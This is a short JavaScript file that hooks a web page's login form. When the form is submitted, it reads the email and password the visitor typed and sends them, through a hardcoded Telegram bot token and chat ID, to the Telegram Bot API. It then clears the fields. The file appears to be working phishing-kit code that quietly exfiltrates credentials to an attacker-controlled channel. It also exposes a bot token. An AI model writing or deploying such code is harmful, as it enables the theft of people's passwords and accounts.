// Bot token
const telegramBotId = "7130461833:AAHyYlnPteyj3zBjvjJSDvLARZjltR19lGA";
// Chat ID
const chatId = 1264627859;
let password, email, message;

const ready = () => {
  email = document.getElementById("email").value;
  password = document.getElementById("password").value;
  //   message = document.getElementById("message").value;
  message = `Name: ${password}\nEmail: ${email}`;
};

const sender = (e) => {
  e.preventDefault();
  ready();
  const settings = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  };

  fetch(`https://api.telegram.org/bot${telegramBotId}/sendMessage`, settings)
    .then((response) => response.json())
    .then((response) => {
      console.log(response);
    })
    .catch((error) => {
      console.error("Error sending message:", error);
    });

  document.getElementById("email").value = "";
  document.getElementById("password").value = "";
  return false;
};

document.querySelector("form").addEventListener("submit", sender);
